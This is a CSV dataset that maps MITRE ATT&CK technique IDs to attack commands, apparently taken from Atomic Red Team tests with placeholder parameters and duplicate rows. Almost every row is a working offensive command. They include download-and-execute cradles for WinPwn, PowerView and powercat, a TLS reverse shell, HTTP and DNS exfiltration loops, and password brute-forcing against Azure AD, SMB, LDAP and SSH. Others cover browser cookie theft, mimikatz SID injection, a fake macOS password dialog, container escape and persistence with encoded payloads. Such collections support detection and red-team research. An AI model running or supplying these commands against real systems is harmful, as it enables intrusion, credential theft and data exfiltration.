mitre_id,command
T1133,"$extlist = #{extension_id} foreach ($extension in $extlist) { new-item -path hklm:\software\wow6432node\google\chrome\extensions\$extension -force new-itemproperty -path ""hklm:\software\wow6432node\google\chrome\extensions\$extension"" -name ""update_url"" -value ""https://clients2.google.com/service/update2/crx"" -propertytype ""string"" -force} start chrome start-sleep -seconds 30 stop-process -name ""chrome""  "
T1021,"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""vim-cmd hostsvc/enable_ssh"" # id_4329"
T1082,$S3CUR3TH1SSH1T_REPO = 'HTTPS://RAW.GITHUBUSERCONTENT.COM/S3CUR3TH1SSH1T' IEX(NEW-OBJECT NET.WEBCLIENT).DOWNLOADSTRING('HTTPS://RAW.GITHUBUSERCONTENT.COM/S3CUR3TH1SSH1T/WINPWN/121DCEE26A7ACA368821563CBE92B2B5638C5773/WINPWN.PS1') ITM4NPRIVESC -NONINTERACTIVE -CONSOLEOUTPUT
T1489,sudo systemctl stop #{service_name} # id_9912
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe""  "
T1110,"import-module -name azuread $passwords = ""#{passwords}"".split(""{`n}"") foreach($password in $passwords) { $pword = convertto-securestring -string ""$password"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword try { write-host "" [-] attempting ${password} on account #{username}."" connect-azuread -credential $credential 2>&1> $null # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success write-host "" [!] #{username}:${password} are valid credentials!`r`n"" break } catch { write-host "" [-] #{username}:${password} invalid credentials.`r`n"" } } write-host ""end of bruteforce"" # id_1901"
T1127,"copy ""#{filename}"" %temp%\libhello.js #{jscpath}\#{jscname} /t:library %temp%\libhello.js # id_7959"
T1543,"new-service -name ""#{service_name}"" -binarypathname ""#{binary_path}"" start-service -name ""#{service_name}"" "
T1218,invoke-athhtmlapplication -scriptengine #{script_engine} -inlineprotocolhandler #{protocol_handler} -userundll32 -rundll32filepath #{rundll32_file_path}
T1095,iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1') powercat -c #{server_ip} -p #{server_port}
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }"
T1566,$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1566.001/bin/phishingattachment.xlsm' [net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 invoke-webrequest -uri $url -outfile $env:temp\phishingattachment.xlsm   
T1491,"$url = ""#{url_of_wallpaper}"" $imglocation = ""#{wallpaper_location}"" $orgwallpaper = (get-itemproperty -path registry::'hkey_current_user\control panel\desktop\' -name wallpaper).wallpaper $orgwallpaper | out-file -filepath ""#{pointer_to_orginal_wallpaper}"" $updatewallpapercode = @' using system.runtime.interopservices; namespace win32{ public class wallpaper{ [dllimport(""user32.dll"", charset=charset.auto)] static extern int systemparametersinfo (int uaction , int uparam , string lpvparam , int fuwinini) ; public static void setwallpaper(string thepath){ systemparametersinfo(20,0,thepath,3); } } } '@ $wc = new-object system.net.webclient try{ $wc.downloadfile($url, $imglocation) add-type $updatewallpapercode [win32.wallpaper]::setwallpaper($imglocation) } catch [system.net.webexception]{ write-host(""cannot download $url"") add-type $updatewallpapercode [win32.wallpaper]::setwallpaper($imglocation) } finally{ $wc.dispose() }"
T1137,"$excelapp = new-object -comobject ""excel.application"" if(-not $excelapp.path.contains(""program files (x86)"")){ write-host ""64-bit office"" $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x64.xll"") } else{ write-host ""32-bit office"" $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x86.xll"") }"
T1615,get-gpo -domain $env:userdnsdomain #{gpo_param} >> #{gpo_output}
T1595,"import-module ""pathtoatomicsfolder/t1595.003/src/webserverscan.ps1"" invoke-wordlistscan -target ""#{target}"" -wordlist ""#{wordlist}"" -timeout ""#{request_timeout}"" -outputfile ""#{output_file}"" write-host ""scan complete. results saved to: #{output_file}"""
T1069,[NET.SERVICEPOINTMANAGER]::SECURITYPROTOCOL = [NET.SECURITYPROTOCOLTYPE]::TLS12 IEX (IWR 'HTTPS://RAW.GITHUBUSERCONTENT.COM/POWERSHELLMAFIA/POWERSPLOIT/F94A5D298A1B4C5DFB1F30A246D9C73D13B22888/RECON/POWERVIEW.PS1' -USEBASICPARSING); FIND-GPOCOMPUTERADMIN -COMPUTERNAME #{COMPUTER_NAME} -VERBOSE
T1030,cd #{folder_path}; split -b 5000000 #{file_name} ls -l #{folder_path}
T1030,"$file = [system.io.file]::openread(#{source_file_path}) $chunksize = #{chunk_size} * 1kb $buffer = new-object byte[] $chunksize while ($bytesread = $file.read($buffer, 0, $buffer.length)) { $encodedchunk = [convert]::tobase64string($buffer, 0, $bytesread) invoke-webrequest -uri #{destination_url} -method post -body $encodedchunk } $file.close()"
T1041,"$dnsserver = ""#{dns_server}"" $exfiltrateddata = ""#{exfiltrated_data}"" $chunksize = #{chunk_size} $encodeddata = [system.text.encoding]::utf8.getbytes($exfiltrateddata) $encodeddata = [convert]::tobase64string($encodeddata) $chunks = $encodeddata -split ""(.{$chunksize})"" foreach ($chunk in $chunks) { $dnsquery = $chunk + ""."" + $dnsserver resolve-dnsname -name $dnsquery start-sleep -seconds 5 } # id_7200"
T1140,"encoded=$(perl -e ""use mime::base64;print(encode_base64('#{message}'));"") perl -le ""use mime::base64;print(decode_base64('$encoded'));"" echo $encoded | perl -le 'use mime::base64;print(decode_base64(<stdin>));' echo $encoded > #{encoded_file} && perl -le 'use mime::base64;open($f,""<"",""#{encoded_file}"");print(decode_base64(<$f>));'   "
T1486,"""""%programfiles%\dcrypt""\#{dcrypt_exe}"""
T1059,"start-process -filepath ""#{autohotkey_path}"" -argumentlist ""#{script_path}"""
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml"""
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe /k tscon #{session_id} /dest:#{destination_id}"" net start sesshijack  "
T1567,"new-item #{rclone_config_path}\rclone -itemtype directory new-item #{rclone_config_path}\rclone\rclone.conf cd ""#{rclone_path}"" .\rclone.exe config create #{remote_share} mega set-content #{rclone_config_path}\rclone\rclone.conf ""[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}"" .\rclone.exe copy --max-size 1700k ""#{dir_to_copy}"" #{remote_share}:test -v"
T1176,"# CHROMIUM $CHROMIUM = ""HTTPS://COMMONDATASTORAGE.GOOGLEAPIS.COM/CHROMIUM-BROWSER-SNAPSHOTS/WIN_X64/1153778/CHROME-WIN.ZIP"" # UBLOCK ORIGIN LITE TO TEST SIDE-LOADING $EXTENSION = ""HTTPS://GITHUB.COM/UBLOCKORIGIN/UBOL-HOME/RELEASES/DOWNLOAD/UBOLITE_2024.11.25.1376/UBOLITE_2024.11.25.1376.CHROMIUM.MV3.ZIP"" SET-LOCATION ""#{WORKING_DIR}"" SET-VARIABLE PROGRESSPREFERENCE SILENTLYCONTINUE INVOKE-WEBREQUEST -URI $CHROMIUM -OUTFILE ""#{WORKING_DIR}\CHROME.ZIP"" INVOKE-WEBREQUEST -URI $EXTENSION -OUTFILE ""#{WORKING_DIR}\EXTENSION.ZIP"" EXPAND-ARCHIVE CHROME.ZIP -DESTINATIONPATH ""#{WORKING_DIR}"" -FORCE EXPAND-ARCHIVE EXTENSION.ZIP -FORCE START-PROCESS .\CHROME-WIN\CHROME.EXE --LOAD-EXTENSION=""#{WORKING_DIR}\EXTENSION\"" -PASSTHRU"
T1001,"cat ""#{script}"" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat ""#{image}"" - > ""#{evil_image}""; strings ""#{evil_image}"" | tail -n 1 | base64 -d | sh  "
T1078,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') obfuskittiedump -consoleoutput -noninteractive # id_4981
T1140,echo #{bash_encoded} | b64decode -r | sh echo #{dash_encoded} | b64decode -r | sh echo #{fish_encoded} | b64decode -r | sh echo #{sh_encoded} | b64decode -r | sh # id_8284
T1557,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/kevin-robertson/inveigh/82be2377ade47a4e325217b4144878a59595e750/inveigh.ps1"" -usebasicparsing) invoke-inveigh -consoleoutput y -nbns y -mdns y -https y -proxy y # id_7537"
T1611,"echo ""current user: #{username}"" sudo -u docker_user sh -c ""sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id""   "
T1115,echo get-process | clip get-clipboard | iex   
T1049,"GET-NETTCPCONNECTION | FOREACH-OBJECT { $P = GET-PROCESS -ID $_.OWNINGPROCESS -ERRORACTION SILENTLYCONTINUE [PSCUSTOMOBJECT]@{ LOCAL = ""$($_.LOCALADDRESS):$($_.LOCALPORT)"" REMOTE = ""$($_.REMOTEADDRESS):$($_.REMOTEPORT)"" STATE = $_.STATE PID = $_.OWNINGPROCESS PROCESS = IF ($P) { $P.PROCESSNAME } ELSE { $NULL } } } | SORT-OBJECT STATE,PROCESS | FORMAT-TABLE -AUTOSIZE"
T1049,$syntaxlist = #{syntax} foreach ($syntax in $syntaxlist) { #{sharpview} $syntax -} # id_9222
T1553,certutil -addstore my #{pfx_path}
T1127,"copy ""#{filename}"" %temp%\libhello.js #{jscpath}\#{jscname} /t:library %temp%\libhello.js # id_7362"
T1020,"$sampledata = ""sample data for exfiltration test"" set-content -path ""#{samplefile}"" -value $sampledata $ftpurl = ""#{ftpserver}"" $creds = get-credential -credential ""#{credentials}"" invoke-webrequest -uri $ftpurl -method put -infile ""#{samplefile}"" -credential $creds   "
T1202,forfiles /p c:\windows\system32 /m notepad.exe /c #{process}   
T1202,"# copy command to clipboard set-clipboard -value '#{command}' # open run dialog start-process -filepath ""powershell"" -argumentlist ""-c (new-object -comobject 'shell.application').filerun()"" -windowstyle hidden # wait for run dialog to open start-sleep -seconds 1 # paste command and execute add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait('^v') start-sleep -milliseconds 500 [system.windows.forms.sendkeys]::sendwait('{enter}')"
T1055,$pathtoatomicsfolder\t1055.004\bin\x64\ntqueueapcthreadex.exe -debug
T1110,"echo password1> passwords.txt echo 1q2w3e4r>> passwords.txt echo password!>> passwords.txt echo spring2022>> passwords.txt echo changeme!>> passwords.txt @for /f ""delims="" %p in (passwords.txt) do @net use %logonserver%\ipc$ /user:""%userdomain%\#{user}"" ""%p"" 1>nul 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\ipc$ > nul # id_3809"
T1578,"aws ec2 create-snapshot --region #{aws_region} --volume-id #{aws_volume_id} --description ""atomic red team test snapshot"" --query ""snapshotid"" --output text # id_5554"
T1140,echo #{bash_encoded} | base64 -d | bash echo #{dash_encoded} | base64 -d | bash echo #{fish_encoded} | base64 -d | bash echo #{sh_encoded} | base64 -d | bash   
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe""   "
T1110,"cd ""pathtoatomicsfolder\..\externalpayloads"" .\kerbrute.exe bruteforce --dc #{domaincontroller} -d #{domain} ""pathtoatomicsfolder\..\externalpayloads\bruteforce.txt""   "
T1078,sudo sysadminctl -guestaccount on
T1037,"ECHO ""#{SCRIPT_COMMAND}"" > #{SCRIPT_PATH} REG.EXE ADD HKCU\ENVIRONMENT /V USERINITMPRLOGONSCRIPT /T REG_SZ /D ""#{SCRIPT_PATH}"" /F"
T1539,"$devtoolsport = 9222 $testurl = ""https://www.google.com"" stop-process -name ""chrome"" -force -erroraction silentlycontinue $chromeprocess = start-process ""chrome.exe"" ""$testurl --remote-debugging-port=$devtoolsport --profile-directory=default"" -passthru start-sleep 10 $jsonresponse = invoke-webrequest ""http://localhost:$devtoolsport/json"" -usebasicparsing $devtoolspages = convertfrom-json $jsonresponse.content $ws_url = $devtoolspages[0].websocketdebuggerurl $ws = new-object system.net.websockets.clientwebsocket $uri = new-object system.uri($ws_url) $ws.connectasync($uri, [system.threading.cancellationtoken]::none).wait() $get_all_cookies_request = '{""id"": 1, ""method"": ""network.getallcookies""}' $buffer = [system.text.encoding]::utf8.getbytes($get_all_cookies_request) $segment = new-object system.arraysegment[byte] -argumentlist $buffer, 0, $buffer.length $ws.sendasync($segment, [system.net.websockets.websocketmessagetype]::text, $true, [system.threading.cancellationtoken]::none).wait() $completemessage = new-object system.text.stringbuilder do { $receivedbuffer = new-object byte[] 2048 $receivedsegment = new-object system.arraysegment[byte] -argumentlist $receivedbuffer, 0, $receivedbuffer.length $result = $ws.receiveasync($receivedsegment, [system.threading.cancellationtoken]::none).result $receivedstring = [system.text.encoding]::utf8.getstring($receivedsegment.array, $receivedsegment.offset, $result.count) $completemessage.append($receivedstring) } while (-not $result.endofmessage) $ws.closeasync([system.net.websockets.websocketclosestatus]::normalclosure, ""closing"", [system.threading.cancellationtoken]::none).wait() try { $response = convertfrom-json $completemessage.tostring() $cookies = $response.result.cookies } catch { write-host ""error parsing json data."" } write-host $cookies stop-process $chromeprocess -force"
T1082,$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-sharpwatson.ps1') invoke-watson
T1197,bitsadmin.exe /create #{bits_job_name} bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file} bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} null bitsadmin.exe /resume #{bits_job_name} ping -n 5 127.0.0.1 >nul 2>&1 bitsadmin.exe /complete #{bits_job_name}
T1030,"$FILE = [SYSTEM.IO.FILE]::OPENREAD(#{SOURCE_FILE_PATH}) $CHUNKSIZE = #{CHUNK_SIZE} * 1KB $BUFFER = NEW-OBJECT BYTE[] $CHUNKSIZE WHILE ($BYTESREAD = $FILE.READ($BUFFER, 0, $BUFFER.LENGTH)) { $ENCODEDCHUNK = [CONVERT]::TOBASE64STRING($BUFFER, 0, $BYTESREAD) INVOKE-WEBREQUEST -URI #{DESTINATION_URL} -METHOD POST -BODY $ENCODEDCHUNK } $FILE.CLOSE()"
T1078,IEX(NEW-OBJECT NET.WEBCLIENT).DOWNLOADSTRING('HTTPS://RAW.GITHUBUSERCONTENT.COM/S3CUR3TH1SSH1T/WINPWN/121DCEE26A7ACA368821563CBE92B2B5638C5773/WINPWN.PS1') SAFEDUMP -CONSOLEOUTPUT -NONINTERACTIVE
T1518,"get-service windefend #check the service state of windows defender get-mpcomputerstatus #provides the current status of security solution elements, including anti-spyware, antivirus, loavprotection, real-time protection, etc get-mpthreat #threats details that have been detected using ms defender # id_2598"
T1202,"scriptrunner.exe -appvscript ""#{payload_path}"""
T1592,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')"""
T1570,net use * '#{remote_path}' /transport:quic /skipcertcheck copy '#{local_file}' '*:\' 
T1020,"$sampledata = ""sample data for exfiltration test"" set-content -path ""#{samplefile}"" -value $sampledata $ftpurl = ""#{ftpserver}"" $creds = get-credential -credential ""#{credentials}"" invoke-webrequest -uri $ftpurl -method put -infile ""#{samplefile}"" -credential $creds  "
T1609,kubectl create -f #{path} -n #{namespace} # wait 3 seconds for the instance to come up sleep 3 kubectl exec -n #{namespace} busybox -- #{command}
T1039,"copy-item -path ""\\#{remote}\c$\#{share_file}"" -destination ""$env:temp\#{local_file}"""
T1057,tasklist # id_6206
T1110,"cp ""$pathtoatomicsfolder/t1110.004/src/credstuffuserpass.txt"" /tmp/ for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'stricthostkeychecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done"
T1570,net use * '#{remote_path}' /transport:quic /skipcertcheck copy '#{local_file}' '*:\' # id_1304
T1218,"copy #{path_ie4uinit} %temp%\ie4uinit.exe copy ""#{path_inf}"" %temp%\ieuinit.inf %temp%\ie4uinit.exe -basesettings"
T1087,"net user dir c:\users\ cmdkey.exe /list net localgroup ""users"" net localgroup"
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" } "
T1614,#{curl_path} -k #{ip_lookup_url}
T1112,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v hidescanetwork /t reg_dword /d 1 /f"
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive) # id_6684"
T1041,"$dnsserver = ""#{dns_server}"" $exfiltrateddata = ""#{exfiltrated_data}"" $chunksize = #{chunk_size} $encodeddata = [system.text.encoding]::utf8.getbytes($exfiltrateddata) $encodeddata = [convert]::tobase64string($encodeddata) $chunks = $encodeddata -split ""(.{$chunksize})"" foreach ($chunk in $chunks) { $dnsquery = $chunk + ""."" + $dnsserver resolve-dnsname -name $dnsquery start-sleep -seconds 5 }"
T1654,wevtutil enum-logs   
T1613,podman build -t t1613 $pathtoatomicsfolder/t1613/src/ podman run --name t1613_container --rm -d -t t1613 podman ps podman stats --no-stream podman inspect $(podman ps -l -q --filter ancestor=t1613)   
T1030,"$file = [system.io.file]::openread(#{source_file_path}) $chunksize = #{chunk_size} * 1kb $buffer = new-object byte[] $chunksize while ($bytesread = $file.read($buffer, 0, $buffer.length)) { $encodedchunk = [convert]::tobase64string($buffer, 0, $bytesread) invoke-webrequest -uri #{destination_url} -method post -body $encodedchunk } $file.close()"
T1090,networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port} networksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}
T1651,"import-module ""pathtoatomicsfolder/t1651/src/t1651-1/awsssmattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") # id_1946"
T1558,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); get-domainuser -preauthnotrequired -properties distinguishedname -verbose # id_4054
T1217,"$username = (whoami).split('\')[1] $url_regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' $history = get-content -path ""$env:systemdrive\users\$username\appdata\local\google\chrome\user data\default\history"" | select-string -allmatches $url_regex | foreach-object { $_.matches.value } | sort -unique $history | out-file -filepath ""$env:userprofile\downloads\chromebrowsinghistory.txt"""
T1001,"cat ""#{script}"" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat ""#{image}"" - > ""#{evil_image}""; strings ""#{evil_image}"" | tail -n 1 | base64 -d | sh"
T1134,"#{mimikatz_path} ""privilege::debug"" ""sid::patch"" ""sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}"" ""exit"""
T1070,hostname whoami
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive) # id_6449"
T1557,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/kevin-robertson/inveigh/82be2377ade47a4e325217b4144878a59595e750/inveigh.ps1"" -usebasicparsing) invoke-inveigh -consoleoutput y -nbns y -mdns y -https y -proxy y # id_9735"
T1056,"PWD_SPOOF=$(OSASCRIPT -E 'DISPLAY DIALOG ""TO PERFORM A SECURITY UPDATE MACOS NEEDS YOUR PASSPHRASE."" WITH TITLE ""MACOS SECURITY UPDATE"" DEFAULT ANSWER """" WITH ICON STOP WITH HIDDEN ANSWER') ECHO $PWD_SPOOF"
T1033,"$tokenset = @{ u = [char[]]'abcdefghijklmnopqrstuvwxyz' n = [char[]]'0123456789' } $upper = get-random -count 5 -inputobject $tokenset.u $number = get-random -count 5 -inputobject $tokenset.n $stringset = $upper + $number $rad = (get-random -count 5 -inputobject $stringset) -join '' $file = ""rad"" + $rad + "".tmp"" whoami.exe /all >> #{output_path}\$file   "
T1486,which_openssl=`which openssl` $which_openssl genrsa -out #{private_key_path} #{encryption_bit_size} $which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path} $which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path} # id_1339
T1014,sudo insmod #{rootkit_path}/#{rootkit_name}.ko # id_7465
T1595,"import-module ""pathtoatomicsfolder/t1595.003/src/webserverscan.ps1"" invoke-wordlistscan -target ""#{target}"" -wordlist ""#{wordlist}"" -timeout ""#{request_timeout}"" -outputfile ""#{output_file}"" write-host ""scan complete. results saved to: #{output_file}"" # id_4277"
T1046,"$ipaddr = ""#{ip_address}"" if ($ipaddr -like ""*,*"") { $ip_list = $ipaddr -split "","" $ip_list = $ip_list.foreach({ $_.trim() }) write-host ""[i] ip address list: $ip_list"" $ports = #{port_list} foreach ($ip in $ip_list) { foreach ($port in $ports) { write-host ""[i] establishing connection to: $ip : $port"" try { $tcp = new-object net.sockets.tcpclient $tcp.connectasync($ip, $port).wait(#{timeout_ms}) | out-null } catch {} if ($tcp.connected) { $tcp.close() write-host ""port $port is open on $ip"" } } } } elseif ($ipaddr -notlike ""*,*"") { if ($ipaddr -eq """") { # assumes the ""primary"" interface is shown at the top $interface = get-netipinterface -addressfamily ipv4 -connectionstate connected | select-object -expandproperty interfacealias -first 1 write-host ""[i] using interface $interface"" $ipaddr = get-netipaddress -addressfamily ipv4 -interfacealias $interface | select-object -expandproperty ipaddress } write-host ""[i] base ip-address for subnet: $ipaddr"" $subnetsubstring = $ipaddr.substring(0, $ipaddr.lastindexof('.') + 1) # always assumes /24 subnet write-host ""[i] assuming /24 subnet. scanning $subnetsubstring'1' to $subnetsubstring'254'"" $ports = #{port_list} $subnetips = 1..254 | foreach-object { ""$subnetsubstring$_"" } foreach ($ip in $subnetips) { foreach ($port in $ports) { try { $tcp = new-object net.sockets.tcpclient $tcp.connectasync($ip, $port).wait(#{timeout_ms}) | out-null } catch {} if ($tcp.connected) { $tcp.close() write-host ""port $port is open on $ip"" } } } } else { write-host ""[error] invalid inputs"" exit 1 }"
T1110,"if (""#{auth}"".tolower() -notin @(""ntlm"",""kerberos"")) { write-host ""only 'ntlm' and 'kerberos' auth methods are supported"" exit 1 } [system.reflection.assembly]::loadwithpartialname(""system.directoryservices.protocols"") | out-null $di = new-object system.directoryservices.protocols.ldapdirectoryidentifier(""#{domain}"",389) $passwordlist = get-content -path ""#{passwords_path}"" foreach ($password in $passwordlist){ $credz = new-object system.net.networkcredential(""#{user}"", $password, ""#{domain}"") $conn = new-object system.directoryservices.protocols.ldapconnection($di, $credz, [system.directoryservices.protocols.authtype]::#{auth}) try { write-host "" [-] attempting ${password} on account #{user}."" $conn.bind() # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success write-host "" [!] #{user}:${password} are valid credentials!"" } catch { write-host $_.exception.message } } write-host ""end of bruteforce"""
T1119,mkdir %temp%\t1119_command_prompt_collection >nul 2>&1 dir c: /b /s .docx | findstr /e .docx for /r c:\ %f in (*.docx) do copy /y %f %temp%\t1119_command_prompt_collection   
T1037,SUDO TOUCH /LIBRARY/STARTUPITEMS/EVILSTARTUP.PLIST
T1037,"filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi [ ""$(uname)"" = 'freebsd' ] && alias python3=python3.9 && printf '#\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local echo ""\npython3 -c \""import os, base64;exec(base64.b64decode('aw1wb3j0ig9zcm9zlnbvcgvukcdly2hvigf0b21pyyb0zxn0igzvcibtb2rpznlpbmcgcmmubg9jywwgpiavdg1wl1qxmdm3ljawnc5yyy5sb2nhbccpcgo='))\"""" | sudo tee -a /etc/rc.local printf 'exit 0' | sudo tee -a /etc/rc.local sudo chmod +x /etc/rc.local # id_6063"
T1083,findmnt -t nfs
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh # id_1255
T1573,"$server_ip = #{server_ip} $server_port = #{server_port} $socket = new-object net.sockets.tcpclient('#{server_ip}', '#{server_port}') $stream = $socket.getstream() $sslstream = new-object system.net.security.sslstream($stream,$false,({$true} -as [net.security.remotecertificatevalidationcallback])) $sslstream.authenticateasclient('fakedomain.example', $null, ""tls12"", $false) $writer = new-object system.io.streamwriter($sslstream) $writer.write('ps ' + (pwd).path + '> ') $writer.flush() [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslstream.read($bytes, 0, $bytes.length)) -ne 0) {$data = (new-object -typename system.text.asciiencoding).getstring($bytes,0, $i); $sendback = (iex $data | out-string ) 2>&1; $sendback2 = $sendback + 'ps ' + (pwd).path + '> '; $sendbyte = ([text.encoding]::ascii).getbytes($sendback2); $sslstream.write($sendbyte,0,$sendbyte.length);$sslstream.flush()} # id_6468"
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml""  "
